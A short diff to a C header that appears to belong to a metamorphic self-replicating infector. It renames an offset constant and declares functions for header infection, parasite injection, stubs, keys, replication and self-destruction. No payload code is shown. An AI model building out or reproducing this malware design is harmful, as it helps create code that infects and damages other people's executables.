@@ -36,8 +36,8 @@
 #define JUMP_SIZE 0x4
 #define PAGE_SIZE 0x1000
 #define FCNT_SIZE 0x7
-#define OFFS_SIZE 0xa
 #define CODE_SIZE 0x5
+#define OFFSET_SIZE 0xa
 
 #define ADDR_OFFSET 0x53
 #define SIZE_OFFSET 0x58
@@ -141,7 +141,7 @@ struct s_keychain
 struct s_metamorph
 {
 	unsigned short code[CODE_SIZE];
-	unsigned int offset[OFFS_SIZE];
+	unsigned int offset[OFFSET_SIZE];
 };
 
 struct s_injection
@@ -173,6 +173,7 @@ void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_c
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void parasite(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection);
 void stub(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection);
+void key(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection);
 void clean(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection);
 void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context);
